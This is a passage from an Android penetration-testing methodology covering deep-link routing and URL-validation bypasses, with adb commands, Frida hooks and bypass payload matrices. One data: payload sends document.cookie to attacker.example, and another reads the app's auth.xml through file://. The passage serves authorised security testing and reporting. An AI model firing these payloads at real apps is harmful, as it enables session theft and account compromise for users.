  `dumpsys shortcut` intent against the current router), and no instant-era host/path remains declared. Paste
  the shortcut dump.

### D09-041 · Trace the router: URI → parser → route → sink, and produce the route table

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — the artefact every later item cites |
| **Attacker** | AM-02, AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0394 (the extraction APIs); MASTG-TECH-0173 (runtime confirmation); MASWE-0029 |

- **Test:** Follow how the entry activity turns the `Uri` into an internal route, and write the table. Without
  it you are firing URIs blind; with it, the rest of this chapter is a targeted list.
- **How:** Start from the stack frame D09-012 gave you.
  ```bash
  # the entry point
  jadx-gui out/sources &        # open the class the hook named
  # the dispatch
  grep -rn -A40 'getIntent()\.getData()' out/sources/<Trampoline>.java | sed -n '1,120p'
  # every case of the dispatcher, and what each consumes
  grep -rnE 'case "|-> *"|equals\("' out/sources/<Router>.java | head -80
  ```
  For each route record: route key · target activity or action · parameters consumed · whether an
  authentication check runs **before** the parameters are used · the terminal sink. Then confirm each row at
  runtime:
  ```bash
  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://<route>?<params>" com.target.app
  adb shell dumpsys activity activities | grep -m1 topResumedActivity
  ```
- **Proof:** The route table. Rank it by sink quality, not by route name: a WebView that already carries the
  session, a payment or account-linking action, a file API, a component launcher, an API base-URL setter.
  Everything else is background.
- **Escalation:** WebView rows → D09-059; state-change rows → D09-066; file rows → D09-063/-064;
  component-launcher rows → D08.
- **Ruled out when:** Every route resolves to a read-only screen that re-fetches its own data behind an
  authenticated session and consumes no attacker-controlled parameter beyond an opaque identifier the server
  authorises. Attach the table with the sink column filled in for every row — a table with blanks is not a
  negative.

### D09-042 · Host validation by `startsWith` / `endsWith` / `contains` — run the whole matrix

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | set by the sink: `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the app sends its token to your origin; `unvalidated_redirects_and_forwards.open_redirect.get_based` (P4) for redirect-only |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | Google Mobile VRP class **"Incorrect URL verification"**, CWE-939 (Improper Authorization in Handler for Custom URL Scheme) — its remediation tip is literally "Read and understand https://hackerone.com/reports/431002 — 'Golden techniques to bypass host validations in Android apps'", and its auditing tip: "Narrow it down to those that are used to branch between different code paths — Could be any part of the URL, not just the host name"; Oversecured WebView checklist §2–3; MASTG risk `unsafe-uri-loading` |

- **Test:** Almost every app that validates a URL validates it wrongly. Find the predicate, then run the
  **whole** matrix against it — apps routinely harden one alias and leave the sibling. The documented-correct
  check is `uri.scheme == "https" && uri.host == trustedHostName`; anything else is a candidate.
- **How:**
  ```bash
  grep -rnE '\.startsWith\(|\.endsWith\(|\.contains\(|\.indexOf\(|\.matches\(|Pattern\.compile' out/sources/ -B3 -A3 \
    | grep -inE 'host|url|uri|domain|origin|scheme|trusted|allow|white' | head -60
  ```
  The matrix, fired at every `url=`-style sink you found:
  ```
  # suffix / infix confusion  (defeats endsWith, contains)
  https://trusted.example.attacker.example/steal
  https://attacker.example/?trusted.example
  https://attacker.example#trusted.example
  https://attacker.example?.trusted.example
  https://attacker.exampletrusted.example/          # endsWith without the leading dot
  https://trusted.example./                          # trailing dot
  # userinfo  (defeats startsWith and naive getHost)
  https://trusted.example@attacker.example/
  https://trusted.example%2f@attacker.example/
  # scheme-relative
  //attacker.example/
  # path/prefix escape
  https://trusted.example/admin/collections/../../
  # param smuggling past a path-only check
  targetapp://webview?url=https://attacker.example/?trusted.example
  ```
  ```bash
  for u in "https://trusted.example.attacker.example/" "https://trusted.example@attacker.example/" "//attacker.example/"; do
    adb shell am start -W -a android.intent.action.VIEW -d "targetapp://webview?url=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")" com.target.app
    sleep 3
  done
  ```
- **Proof:** For each payload, print **what the validator saw** versus **what the sink resolved** — the
  divergence is the bug. Concretely: a Frida hook logging `Uri.parse(u).getHost()` at the validator, and your
  web server's access log showing the request that actually arrived. A screenshot alone is not enough.
- **Escalation:** → D09-059/-060 (the sink decides the rating); → D10 bridge abuse; → D13.
- **Ruled out when:** The validator parses with `Uri.parse` (or `java.net.URI`) and compares `getHost()` with
  **equality** against a fixed list, *and* checks the scheme, *and* you have fired the full matrix and
  recorded a rejection for each. Paste the predicate and the matrix results — a validator you read but did not
  exercise is not a negative.

### D09-043 · The host is checked and the scheme is not

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) for `file://`; `cross_site_scripting_xss.stored.url_based` (P3) or the sink's own path for `javascript:`/`data:` |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | MASTG risk `unsafe-uri-loading` (MASVS-CODE) and `cross-app-scripting`; Oversecured WebView checklist §3 (missing scheme check enabling `javascript:`/`file:`/`content:`); H1 **#3475626** (LinkedIn, **High 8.1** — the `javascript://` plus `#` trick) |

- **Test:** The most common half-validation: the code extracts `getHost()`, compares it correctly, and never
  looks at the scheme. Every scheme that carries a host component then passes.
- **How:**
  ```bash
  grep -rn 'getHost()' out/sources/ -B6 -A6 | grep -nE 'getScheme\(\)|"https"|equalsIgnoreCase\("https' \
    || echo "NO SCHEME CHECK NEAR getHost() -- candidate"
  ```
  Payloads, all carrying the trusted host so the validator is satisfied:
  ```
  javascript://trusted.example/%0aalert(document.domain)
  javascript://trusted.example/%0aalert('1#')        # survives an appended ?param= — the LinkedIn shape
  data://trusted.example,<script>fetch('https://attacker.example/?'+document.cookie)</script>
  data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
  file://trusted.example/data/data/com.target.app/shared_prefs/auth.xml
  content://trusted.example/
  http://trusted.example/                            # downgrade: host ok, transport is the payload
  ```
  ```bash
  adb shell am start -a android.intent.action.VIEW -d "targetapp://webview?url=javascript://trusted.example/%0aalert(document.domain)" com.target.app
  adb shell am start -a android.intent.action.VIEW -d "targetapp://webview?url=file:///data/data/com.target.app/shared_prefs/auth.xml" com.target.app
  ```
- **Proof:** The `alert(document.domain)` rendering the app's own web origin (screenshot), or the
  `shared_prefs` XML rendered on screen. For `http://`, the cleartext request captured on the wire.
- **Escalation:** `javascript:` in the app's web origin → D10 bridge and cookie access → D13; `file://` →
  D09-063 → D11; `http://` → D14 cleartext.
- **Ruled out when:** The validator asserts `scheme == "https"` before the host comparison (quote the line),
  **or** the sink itself refuses non-http(s) — demonstrate the refusal for `javascript:`, `file:` and
  `content:` individually. On API 30+ `setAllowFileAccess` defaults to **false**, which closes the `file://`
  half but not the others; check the actual setting rather than assuming (D10).

### D09-044 · Backslash and userinfo divergence between `Uri.parse().getHost()` and the loader

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the loaded origin receives the session |
| **Attacker** | AM-02 |
| **Applies to** | **LEGACY** — the backslash form is documented as affecting **minSdkVersion ≤ 24** (Android 7.0 and below). The userinfo/suffix forms in D09-042 are version-independent; use `java.net.URI` divergence on minSdk 25+ |
| **Maps to** | Oversecured WebView checklist §5 ("affected Android 7.0 and below; fix is `minSdkVersion` 25+ or validate with `java.net.URI`"); the corpus's host-validation-bypass reference (minSdk ≤ 24) |

- **Test:** `Uri.parse("https://attacker.example\\@trusted.example").getHost()` returns `trusted.example`
  while `WebView.loadUrl()` navigates to `attacker.example`. The validator and the loader disagree about where
  the authority ends. Only reportable where the app's `minSdkVersion` actually admits it.
- **How:**
  ```bash
  aapt dump badging base.apk | grep sdkVersion          # exploitable only if minSdkVersion <= 24
  grep -n minSdkVersion out/apktool.yml
  adb shell am start -a android.intent.action.VIEW \
    -d 'targetapp://webview?url=https%3A%2F%2Fattacker.example%5C%40trusted.example%2F' com.target.app
  ```
  Confirm the divergence explicitly rather than inferring it:
  ```javascript
  Java.perform(function () {
    var Uri = Java.use('android.net.Uri');
    Uri.getHost.implementation = function () { var h = this.getHost(); console.log('[validator sees] ' + h + '  from ' + this.toString()); return h; };
    var WV = Java.use('android.webkit.WebView');
    WV.loadUrl.overload('java.lang.String').implementation = function (u) { console.log('[loader loads]  ' + u); return this.loadUrl(u); };
  });
  ```
- **Proof:** The paired hook output — validator reading `trusted.example`, loader loading `attacker.example` —
  plus a request arriving at your server from the device. Quote the `minSdkVersion` in the same paragraph.
- **Escalation:** → D09-060 (the headers follow the URL); → D10.
- **Ruled out when:** `minSdkVersion` ≥ 25, **or** the validator re-parses with `java.net.URI` (which rejects
  the backslash form), **or** validation happens on the string the loader actually receives. Fall back to the
  version-independent payloads in D09-042 and record that you did.

### D09-045 · `Uri` object smuggling via reflection (`HierarchicalUri`)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) → the sink's path |
| **Attacker** | AM-03 (requires app-to-app delivery of a `Uri` **object**, not a browser link) |
| **Applies to** | **LEGACY-leaning** — Oversecured notes API 28+ forbids internal-interface use "but this can easily be bypassed", and describes it as less relevant on Android 12+. Report only where you demonstrate it on the target's supported API range |
| **Maps to** | Oversecured WebView checklist §4 and deep-link post (HierarchicalUri Bypass); the one-line fix is re-parsing: `Uri.parse(intent.getData().toString())` |

- **Test:** When a third-party app (not a browser) hands the victim a `Uri` **object** in an intent, that
  object can be built reflectively so `getHost()` returns the allowed host while the string form resolves
  elsewhere. The root cause — and what you should report regardless of whether the reflection still works — is
  the app trusting the *object* instead of re-parsing its string form.
- **How:**
  ```bash
  grep -rn 'getIntent()\.getData()' out/sources/ -A8 | grep -nE 'getHost\(\)|getScheme\(\)|getUserInfo\(\)|getAuthority\(\)'
  grep -rn 'Uri\.parse(.*getData()\.toString())' out/sources/     # presence = mitigated, quote it
  ```
  From the attacker app, construct the divergent `Uri` and deliver it explicitly:
  ```java
  Intent i = new Intent(Intent.ACTION_VIEW, craftedUri);   // built via reflection on android.net.Uri$HierarchicalUri
  i.setComponent(new ComponentName("com.target.app", "com.target.app.DeepLinkActivity"));
  startActivity(i);
  ```
- **Proof:** The app's own validation logging the host as `trusted.example` while the WebView loads
  `https://trusted.example@attacker.example` — both observed on the target's supported API level. If the
  reflection is blocked on your device, say so and report the **missing re-parse** as the root cause at
  reduced severity rather than claiming an exploit you did not run.
- **Escalation:** → D09-059; → D08 (the same delivery path carries nested intents).
- **Ruled out when:** The handler re-parses (`Uri.parse(intent.getData().toString())`) before validating —
  quote the line — or the activity is not reachable with an explicit intent from another app (check
  `exported` and `enforceIntentFilter`, D09-053).

### D09-046 · Parser-differential sweep: where the validator's parse and the sink's parse disagree

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | inherits the sink — `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the sink is a session-bearing WebView |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | Google Mobile VRP "Incorrect URL verification" auditing tip ("Could be any part of the URL, not just the host name"); the corpus's parser-differential method |

- **Test:** Stop trying one malformed URL. The bug class is **two parsers, one string**: `android.net.Uri` at
  the validator, `java.net.URI`/OkHttp/`HttpUrl`/the WebView's own URL parser at the sink. Sweep the class
  systematically across every URL component.
- **How:** Build the corpus by component, then run both parsers over each entry offline before you fire it:
  ```python
  # d09_differential.py
  from urllib.parse import urlsplit
  import subprocess, json
  cases = [
   "https://trusted.example@attacker.example/", "https://attacker.example\\@trusted.example/",
   "https://trusted.example%2f@attacker.example/", "https://trusted.example:@attacker.example/",
   "https://trusted.example./", "https://TRUSTED.EXAMPLE/", "https://trusted.example%00.attacker.example/",
   "https://trusted.example%09.attacker.example/", "https://trusted。example/",           # ideographic full stop
   "https://xn--trusted-example.attacker.example/", "//attacker.example/",
   "https:/\\/\\attacker.example/", "https://attacker.example/#@trusted.example/",
   "https://attacker.example/?x=https://trusted.example/", "https://trusted.example/..;/admin",
   "https://trusted.example/%2e%2e/admin", "https://trusted.example/%252e%252e/admin",
  ]
  for c in cases:
      print(f'{c:60} python-host={urlsplit(c).hostname}')
  ```
  Then get Android's answer for the same strings with a Frida one-liner calling `Uri.parse(...).getHost()`,
  and the sink's answer from a `loadUrl`/OkHttp hook. Three columns per row.
- **Proof:** A row where the three columns disagree — validator host `trusted.example`, sink host
  `attacker.example` — and the corresponding request in your server log. That divergence *is* the finding;
  present it as a table, not a narrative.
- **Escalation:** → the sink's own item (D09-059 onwards); → D10 for WebView-side parsing.
- **Ruled out when:** All cases agree across all three parsers, or the validator operates on exactly the
  string the sink receives (single-parse design — quote it). Count your cases: if you fired 17 and printed 9
  rows, the loop ate something.

### D09-047 · Java validator versus JS/Dart router — the cross-boundary differential

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) → the framework sink's path |
| **Attacker** | AM-02, AM-03 |
| **Applies to** | React Native, Flutter, Cordova/Capacitor, KMP — any app where the URI crosses a language boundary |
| **Maps to** | MASTG-TECH-0172, MASTG-TECH-0173; the corpus's cross-platform handoff method |

- **Test:** Two parsers again, but now in two languages with different URL semantics: `android.net.Uri` on the
  Java side, `URL`/`Linking` in JS, `Uri` in Dart, `window.location` in the WebView. A URI that the Java
  allow-list accepts as host `trusted.example` may be routed by the Dart or JS side to something else
  entirely — and the Java side's decision is the one the developer tested.
- **How:** Instrument both sides of the same fired URI.
  ```javascript
  // Java side
  Java.perform(function () {
    var Uri = Java.use('android.net.Uri');
    Uri.getHost.implementation = function () { var h=this.getHost(); console.log('[JAVA] host='+h+' uri='+this.toString()); return h; };
  });
  ```
  ```bash
  # JS side (React Native)
  adb logcat -s ReactNativeJS:V
  # Dart side: recover the route literals and hook the router recovered with Blutter
  strings -8 lib/arm64-v8a/libapp.so | grep -iE 'allowedHost|isAllowed|instanceHostname|routeName'
  # fire one URI and read both logs
  adb shell am start -a android.intent.action.VIEW -d 'https://trusted.example@attacker.example/route?x=1' com.target.app
  ```
- **Proof:** The two log lines for the same input showing different hosts or different routes. Then show what
  the framework side does with its answer — a navigation, a fetch, a WebView load.
- **Escalation:** → D19 framework internals; → D09-059.
- **Ruled out when:** The Java side normalises and re-serialises the URI before the handoff (so the framework
  parses a canonical string it cannot disagree about), **or** the framework side re-validates against its own
  allow-list. Quote both.

### D09-048 · `pathPattern` glob semantics — no backtracking, lazy `.*`, greedy `*`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — rated on the handler reached |
| **Attacker** | AM-02 |
| **Applies to** | all. `pathSuffix` and `pathAdvancedPattern` are **API 31+**; `<data android:query*>` and `android:fragment*` matchers are **API 35+**, so an app using them has a *narrower* filter on old devices — a behavioural split worth testing on both |
| **Maps to** | `guide/topics/manifest/data-element` — `.` matches any single character; `*` matches zero or more of the **immediately preceding** character and is greedy; `.*` matches any sequence and is **lazy**; there is **no backtracking**, a single forward pass. Documented non-matches: `"abc.*xyz"` does **not** match `"abcpxqrxyz"`; `"a.*.c"` does **not** match `"abbbc"`; `"a*a"` does **not** match `"aaa"` |

- **Test:** `pathPattern` is not a regex and does not behave like one. Developers write a pattern believing it
  matches more or less than it does — both directions are bugs. Backslashes must be double-escaped in XML
  (`\\.` for a literal dot), which is another routine mistake.
- **How:**
  ```bash
  grep -oE 'android:path(Pattern|AdvancedPattern|Suffix|Prefix|)="[^"]*"' out/AndroidManifest.merged.xml | sort -u
  ```
  For each declared pattern, fuzz the boundary in both directions — paths you expect in, and paths you expect
  out:
  ```bash
  for p in "/pay/123" "/pay/" "/paysomething" "/pay/123/extra" "/PAY/123" "/pay/../admin" \
           "/pay/123/../../admin" "/pay/123%2F..%2Fadmin" "/pay//123" "/pay/./123"; do
    printf '%-32s ' "$p"
    adb shell am start -W -a android.intent.action.VIEW -d "https://target.example$p" com.target.app 2>&1 \
      | grep -E 'Status|Activity|Error' | tr '\n' ' '; echo
  done
  ```
- **Proof:** A URL the developer believed excluded resolving into the app (`Status: ok` naming the target
  activity), or one they believed included failing to resolve. Pair the over-match with a privileged in-app
  action for impact; the pattern alone is not a finding.
- **Escalation:** Over-match reaching an authenticated handler → D09-066/-067; under-match is a functional
  bug worth a note, not a finding.
- **Ruled out when:** Every declared pattern matches exactly the intended path set across the boundary fuzz,
  on both an API 30 and an API 31+ device where `pathSuffix`/`pathAdvancedPattern` are in play. Paste the
  matrix.

### D09-049 · `pathPrefix` escape via `../` in the path

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — rated on what the escaped path reaches |
| **Attacker** | AM-02 |
| **Applies to** | all apps using `android:pathPrefix` to scope an App Link |
| **Maps to** | H1 **#1087744** (Shopify, **Low 3.1**) — the verbatim reproduction is `am start -W -a android.intent.action.VIEW -d "https://ravel17.myshopify.com/admin/collections/../../"`; the same report's deeper form reached `/admin/collections/.../oauth/install_custom_app?client_id=…` |

- **Test:** The filter matches on the *literal* path, but the handler (or the WebView it hands the URL to)
  normalises `../` afterwards. So a URL that satisfies `pathPrefix="/admin/collections"` can end up loading
  something else entirely inside the app's trusted context.
- **How:**
  ```bash
  grep -oE 'android:pathPrefix="[^"]*"' out/AndroidManifest.merged.xml | sort -u
  adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/admin/collections/../../" com.target.app
  adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/admin/collections/../../oauth/authorize?client_id=X" com.target.app
  adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/admin/collections/..%2f..%2fsettings" com.target.app
  ```
- **Proof:** `Status: ok` for a URL whose *effective* path lies outside the declared prefix, plus the screen or
  the outbound request showing that the app acted on the normalised path, not the literal one. Shopify's rating
  was **Low 3.1** precisely because the WebView it reached did not carry the primary session — check that
  before you rate it higher.
- **Escalation:** → D09-059 when the escaped path lands in a session WebView; → D09-066 when it lands on an
  action.
- **Ruled out when:** The handler re-checks the normalised path against the same prefix before acting (quote
  the check), or the WebView is a non-session context. Say which.

### D09-050 · Host wildcards, case sensitivity, trailing dots and Unicode

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated; chains with `server_security_misconfiguration.misconfigured_dns.subdomain_takeover` (P3) |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | `guide/topics/manifest/data-element` — `scheme`, `host` and `mimeType` are **case-sensitive and must be lowercase** (unlike the RFCs); `*` in `host` matches zero or more characters and **must be the first character**; `*.google.com` is valid and matches `www.google.com`, `.google.com` and `developer.google.com`; `google.co.*` is **invalid**; Gowthams open-redirect research (ideographic full stop `%E3%80%82`) |

- **Test:** Four separate mistakes live in `android:host`. A wildcard admitting an unmanaged subdomain; an
  uppercase host that silently never matches (a functional bug that hides a security intent); a trailing dot
  form that satisfies a code-side `endsWith` while resolving to the same host; and Unicode/IDN forms that the
  filter, the validator and the resolver each treat differently.
- **How:**
  ```bash
  grep -oE 'android:host="[^"]*"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u
  for h in "target.example" "TARGET.example" "evil-target.example" "target.example.attacker.example" \
           ".target.example" "a.target.example" "target.example." "targ%65t.example" \
           "target。example" "xn--targt-zra.example"; do
    printf '%-38s ' "$h"
    adb shell am start -W -a android.intent.action.VIEW -d "https://$h/path" com.target.app 2>&1 | grep -E 'Status|Error' | tr '\n' ' '; echo
  done
  ```
  Every wildcard host is also a D09-020 candidate — enumerate the subdomains that actually exist and check
  whether any is dangling.
- **Proof:** An attacker-controllable host resolving into the app, most commonly a wildcard admitting an
  unmanaged subdomain. For the case-sensitivity mistake, show the uppercase filter never matching while the
  developer clearly intended it to.
- **Escalation:** Wildcard host + subdomain takeover (D09-020) → deep-link hijack → D10 XSS in the app's web
  origin → D13.
- **Ruled out when:** No `android:host` contains `*`, every host is lowercase, and every declared host
  resolves to client-controlled infrastructure. List the hosts and their resolution.

### D09-051 · `UriRelativeFilterGroup` exclusion rules bypassed by encoding

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-02 |
| **Applies to** | **Android 15 (API 35)+** |
| **Maps to** | `developer.android.com/about/versions/15/features` — `UriRelativeFilterGroup`, `UriRelativeFilter`, `<uri-relative-filter-group>`, including "blocking/exclusion rules" |

- **Test:** Android 15 added precise intent filters that match on query parameters and fragments, including
  **exclusion** rules. Two failure modes: an exclusion rule the developer believes blocks a dangerous path
  which does not match the encoded form, and a group that inadvertently *widens* the filter because the
  developer read it as an intersection when it is not.
- **How:**
  ```bash
  grep -n -A12 'uri-relative-filter-group' out/AndroidManifest.merged.xml
  for p in "/admin" "/%61dmin" "//admin" "/./admin" "/x/../admin" "/admin/" "/ADMIN"; do
    printf '%-20s ' "$p"
    adb shell am start -W -a android.intent.action.VIEW -d "https://target.example$p?debug=1" com.target.app 2>&1 | grep -E 'Status|Error' | tr '\n' ' '; echo
  done
  # and the query/fragment matchers
  adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/x?blocked=1&blocked=0" com.target.app
  adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/x#blocked=1" com.target.app
  ```
- **Proof:** A path, query parameter or fragment the group intended to exclude still resolving to the app —
  `Status: ok` plus the activity in `dumpsys activity activities`.
- **Escalation:** → D09-059 if the reached handler loads the URL into a WebView; → D09-066 for actions.
- **Ruled out when:** The app declares no `<uri-relative-filter-group>` (the common case), or every exclusion
  rule rejects the full encoding set. Paste the group and the matrix.

### D09-052 · `allowNullAction` — an action-less intent takes a different branch

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **Android 16 (API 36)+** with `android:intentMatchingFlags` containing `allowNullAction` |
| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-16` — `allowNullAction`, "Intents Without Action Cannot Match Intent Filters"; the documented logcat filter `tag=:PackageManager & (message:"Intent does not match component's intent filter:" | message:"Access blocked:")` |

- **Test:** Android 16's default hardening rejects action-less intents against intent filters.
  `allowNullAction` re-permits them. A deep-link handler that branches on `getAction()` will take its default
  branch for an action-less intent — and that branch is frequently the one with no validation, because the
  developer assumed it was unreachable.
- **How:**
  ```bash
  grep -n 'intentMatchingFlags' out/AndroidManifest.merged.xml
  adb shell am start -n com.target.app/.DeepLinkActivity -d "https://target.example/pay?amt=1"     # note: no -a
  adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
  ```
  ```javascript
  Java.perform(function () {
    var I = Java.use('android.content.Intent');
    I.getAction.implementation = function () { var a = this.getAction(); console.log('[getAction] ' + a); return a; };
  });
  ```
- **Proof:** The activity starting with `getAction() == null`, the absence of the `PackageManager` block line,
  and a hook showing the handler's default branch running. Then show what that branch skips relative to the
  `ACTION_VIEW` branch.
- **Escalation:** → D09-066 if the default branch skips an auth check; → D15.
- **Ruled out when:** `allowNullAction` is absent, or the handler rejects a null action explicitly. On
  devices below API 36 the hardening does not exist at all and an action-less explicit intent is delivered
  regardless — say which device you tested on.

### D09-053 · `enforceIntentFilter` absent: an explicit `VIEW` with an arbitrary URI

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 (local app; browser delivery remains filter-bound) |
| **Applies to** | all; the attribute is **Android 16 (API 36)** opt-in, so its absence on older targets is a platform limitation rather than a defect — rate accordingly, and use sibling comparison |
| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-16` (`android:intentMatchingFlags` values `none` / `enforceIntentFilter` / `allowNullAction`, settable on `<application>`, `<activity>`, `<activity-alias>`, `<receiver>`, `<service>`, `<provider>`, component value overriding application value) |

- **Test:** Without `enforceIntentFilter`, a local app can send an **explicit** `ACTION_VIEW` intent carrying
  an *arbitrary* URI — any host, `javascript:`, `data:`, `file:` — to the exported router activity, bypassing
  the intent filter entirely. This matters most for Flutter/RN shells, where the filter is the only thing
  restricting what reaches the framework router.
- **How:**
  ```bash
  grep -n 'intentMatchingFlags' out/AndroidManifest.merged.xml
  adb shell am start -a android.intent.action.VIEW -d 'https://attacker.example/anything' -n com.target.app/.MainActivity
  adb shell am start -a android.intent.action.VIEW -d 'javascript:alert(1)'                 -n com.target.app/.MainActivity
  adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
  ```
  Re-run the same from the zero-permission probe app (`am start` as `shell` is not AM-03 — D09-076).
- **Proof:** `result code=3` (delivered) with no `Access blocked:` line, plus evidence that the router acted on
  the arbitrary URI. With the flag set you get `result code=-92 / Access blocked` — both observed on-device is
  the cleanest form of this evidence.
- **Escalation:** Arbitrary URI into the Dart/JS router → D09-047 → D09-059; → D08 when the intent also
  carries nested extras. **Sibling comparison** makes this reportable rather than academic: if another app in
  the same vendor family sets `enforceIntentFilter`, the absence is a defect, not a design choice.
- **Ruled out when:** `android:intentMatchingFlags="enforceIntentFilter"` is set at application scope with no
  component-level override, and the explicit-intent probe returns `-92`. Alternatively, the router validates
  the URI itself regardless of how it arrived — quote the validator. On a device below API 36 you cannot
  demonstrate the block; say so rather than claiming the control is absent.

### D09-054 · `intentMatchingFlags="none"` — a hole punched in the app's own hardening

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **Android 16 (API 36)+**, targetSdk 36 |
| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-16` — `"none"` **disables all special matching rules and takes precedence**; the same logcat filter as D09-052 |

- **Test:** The security-relevant pattern is an app that sets `enforceIntentFilter` globally and then sets
  `android:intentMatchingFlags="none"` on one component. That component is a deliberately de-hardened target,
  and it is usually the router — because the router is what broke when hardening was enabled.
- **How:**
  ```bash
  grep -nE 'intentMatchingFlags="(none|enforceIntentFilter|allowNullAction)"' -B4 out/AndroidManifest.merged.xml
  # confirm the relaxation is real on the named component, and that siblings still block
  adb shell am start -a android.intent.action.VIEW -d 'https://attacker.example/x' -n com.target.app/<the "none" component>
  adb shell am start -a android.intent.action.VIEW -d 'https://attacker.example/x' -n com.target.app/<a sibling component>
  adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
  ```
- **Proof:** The component carrying `"none"` inside an `enforceIntentFilter` application, reachable with a
  non-matching explicit intent, with **no** `Access blocked:` line — while a sibling component in the same app
  does produce one. That paired output is the evidence.
- **Escalation:** → whatever the de-hardened component parses (D09-041 route table); → D04–D06 for the
  non-deep-link components carrying the same flag.
- **Ruled out when:** No component declares `"none"`, or the ones that do parse nothing attacker-controlled.
  Enumerate them.

### D09-055 · Over-broad path scope on a correctly verified App Link

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) → the sink's path |
| **Attacker** | AM-02 |
| **Applies to** | apps whose hosts report `verified` — this is the residual risk once interception is closed |
| **Maps to** | the corpus's ruled-out discipline ("App Links path-scoped correctly" is a negative worth keeping); MASTG-TECH-0174 |

- **Test:** When `pm get-app-links` says `verified`, interception is genuinely closed and D09-026/-027 are
  dead. Do not stop there. The residual question is scope: a verified host with `pathPrefix="/"` (or no path
  matcher at all) means **every** URL on that domain enters the app's router, including the ones served by a
  user-content subpath, a marketing CMS, or an open-redirect endpoint on the web side.
- **How:**
  ```bash
  adb shell pm get-app-links com.target.app                    # confirm 'verified' first
  grep -B6 -A10 'autoVerify="true"' out/AndroidManifest.merged.xml | grep -E 'android:(host|path|pathPrefix|pathPattern|pathSuffix)'
  # what does the WEB side do at the paths the app claims?
  curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "https://target.example/r?u=https://attacker.example/"
  adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/r?u=https://attacker.example/" com.target.app
  ```
- **Proof:** A verified-host URL that the app routes into a privileged handler although the web page at the
  same URL is public or user-controlled — and, best of all, a web-side open redirect on a claimed path that
  the app follows into its own WebView.
- **Escalation:** → D09-061 (redirect followed after the check); → D15 for the web-side redirect endpoint,
  which is a separate fix surface and a separate report.
- **Ruled out when:** Each verified host declares an explicit, narrow path scope covering only
  app-owned routes, and no claimed path corresponds to user-controlled or redirecting web content. Record this
  as a positive ruled-out entry — it is one of the few genuinely defensible negatives in this chapter.

### D09-056 · An expired or registrable domain inside the code-side allow-list

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the app attaches its auth headers to the resurrected host |
| **Attacker** | AM-01 (register the domain), AM-02 (deliver the link) |
| **Applies to** | all |
| **Maps to** | Oversecured "Android deep link vulnerabilities" §5 — Domain Takeover via Expired Whitelist Entry; verbatim: "Static analysis cannot know that a domain has expired" |

- **Test:** The allow-list is not bypassed; it is *correct*, and one of its entries is a domain the original
  owner let lapse. No scanner will ever find this, which is precisely why it is worth an hour.
- **How:**
  ```bash
  # harvest every host the app treats as trusted, from code and resources
  grep -rhoE '[a-z0-9][a-z0-9.-]{2,60}\.(com|net|org|io|co|app|dev|cloud|me|link|tv|ai|xyz)' out/sources/ out/res/values/*.xml \
    | tr 'A-Z' 'a-z' | sort -u > /tmp/hosts.txt
  wc -l /tmp/hosts.txt
  python3 - <<'PY'
  import subprocess
  for h in [l.strip() for l in open('/tmp/hosts.txt') if l.strip()]:
      apex = '.'.join(h.split('.')[-2:])
      try:
          w = subprocess.run(['whois', apex], capture_output=True, text=True, timeout=15).stdout.lower()
      except Exception as e:
          print(f'{h:50} WHOIS-ERROR {e}'); continue
      flag = 'FREE?' if ('no match' in w or 'not found' in w or 'no data found' in w) else ''
      exp = next((l.strip() for l in w.splitlines() if 'expir' in l or 'paid-till' in l), '')
